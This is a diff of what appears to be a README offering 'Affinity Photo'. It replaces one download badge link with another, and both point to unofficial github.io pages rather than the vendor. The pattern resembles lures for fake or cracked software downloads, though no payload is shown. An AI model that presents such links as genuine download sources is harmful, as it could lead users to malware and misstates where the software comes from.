@@ -3,7 +3,7 @@
 
 ![Affinity Photo](https://vectorseek.com/wp-content/uploads/2022/02/Affinity-Photo-Logo-Vector.svg-.png)
 
-[![GET Affinity Photo](https://img.shields.io/badge/GET%20%E2%80%94%20Affinity%20Photo-0078D6?style=for-the-badge&logoColor=white)](https://aseelpfj636456.github.io/.github/affinity-photo-download)
+[![GET Affinity Photo](https://img.shields.io/badge/GET%20%E2%80%94%20Affinity%20Photo-0078D6?style=for-the-badge&logoColor=white)](https://affinity-photoshop-editor.github.io/.github/)
 
 ---
 
